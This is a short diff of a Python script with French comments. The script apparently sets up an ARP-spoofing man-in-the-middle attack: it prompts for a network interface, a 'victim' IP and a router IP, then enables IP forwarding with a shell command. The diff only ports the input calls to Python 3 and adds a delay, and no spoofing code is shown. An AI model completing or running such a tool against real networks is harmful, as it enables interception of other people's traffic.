@@ -6,14 +6,14 @@ import time
 
 # Demande a l'utilisateur des infos sur la victime
 try:
-    interface = raw_input"[*] Entre l'interface désiré: "
-    victimIP = raw_input("[*] Entre l'IP de la victime: ")
-    gateIP = raw_input("[*] Entre l'IP routeur: ")
+    interface = input("[*] Entre l'interface désiré: ")
+    victimIP = input("[*] Entre l'IP de la victime: ")
+    gateIP = input("[*] Entre l'IP routeur: ")
 except KeyboardInterrupt:
     print ("\n[*] demande de fermeture de l'utilisateur")
     print ("[*] Quitter ...")
     sys.exit(1)
-
+time.sleep(10)
 print ("\n[*] Début transmition IP ...")
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
